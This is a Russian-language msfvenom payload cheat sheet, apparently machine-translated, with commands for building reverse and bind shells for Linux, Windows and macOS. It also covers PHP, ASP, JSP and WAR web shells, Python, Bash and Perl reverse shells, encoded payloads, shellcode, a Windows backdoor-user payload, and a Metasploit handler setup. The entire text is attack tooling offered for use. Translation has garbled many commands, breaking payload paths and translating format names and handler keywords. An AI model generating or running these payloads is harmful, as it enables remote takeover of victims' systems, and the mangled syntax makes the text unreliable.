# Список полезных нагрузок

```
msfvenom -l
```

# Двоичные файлы

#### Оболочка обратного

```
msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = <локальный IP-адрес> LPORT = <локальный порт> -f elf> shell.elf
```


#### Оболочка Linux Bind Meterpreter

```
msfvenom -p linux / x86 / meterpreter / bind_tcp RHOST = <Удаленный IP-адрес> LPORT = <Локальный порт> -f elf> bind.elf
```

#### Linux Bind Shell

```
msfvenom -p generic / shell_bind_tcp RHOST = <Удаленный IP-адрес> LPORT = <Локальный порт> -f elf> term.elf
```

#### Windows Meterpreter Обратный TCP Shell

```
msfvenom -p windows / meterpreter / reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f exe> shell.exe
```

#### Оболочка Windows Reverse TCP

```
msfvenom -p windows / shell / reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f exe> shell.exe
```

#### Windows Encoded Meterpreter Оболочка обратного просмотра Windows

```
msfvenom -p windows / meterpreter / reverse_tcp -e shikata_ga_nai -i 3 -f exe> encoded.exe
```

#### Оборотная оболочка Mac

```
msfvenom -p osx / x86 / shell_reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f мачо> shell.macho
```

#### Mac Bind Shell

```
msfvenom -p osx / x86 / shell_bind_tcp RHOST = <Удаленный IP-адрес> LPORT = <Локальный порт> -f мачо> bind.macho
```

# Веб-полезные нагрузки

#### PHP Meterpreter Обратный TCP

```
msfvenom -p php / meterpreter_reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f raw> shell.php
cat shell.php | pbcopy && echo '<? php' | tr -d '\ n'> shell.php && pbpaste >> shell.php 
```

#### ASP Meterpreter Обратный TCP

```
msfvenom -p windows / meterpreter / reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f asp> shell.asp
```

#### JSP Java Meterpreter Обратный TCP

```
msfvenom -p java / jsp_shell_reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f raw> shell.jsp
```

#### WAR

```
msfvenom -p java / jsp_shell_reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f война> shell.war
```

#### Скриптовые полезные нагрузки Python Reverse Shell

```
msfvenom -p cmd / unix / reverse_python LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f raw> shell.py
```

#### Bash Unix Reverse Shell

```
msfvenom -p cmd / unix / reverse_bash LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f raw> shell.sh
```

#### Perl Unix Обратная оболочка

```
msfvenom -p cmd / unix / reverse_perl LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f raw> shell.pl
```

# Shellcode


#### Windows Meterpreter Обратный шелл-код TCP

```
msfvenom -p windows / meterpreter / reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f <язык>
```

#### Linux Meterpreter Обратный шелл-код TCP

```
msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f <язык>
```

#### Mac Shell Обратный TCP Shellcode 

```
msfvenom -p osx / x86 / shell_reverse_tcp LHOST = <Локальный IP-адрес> LPORT = <Локальный порт> -f <язык>
```

#### Создать пользователя

```
msfvenom -p windows / adduser USER = хакер PASS = Hacker123 $ -f exe> adduser.exe
```

# Metasploit Handler

```
использование эксплуатируют / мульти / обработчик
набор ПОЛЕЗНОЙ <имя Payload>
Set RHOST <Remote IP>
набор LHOST <Local IP>
набор LPORT <локальный порт>
Run
```
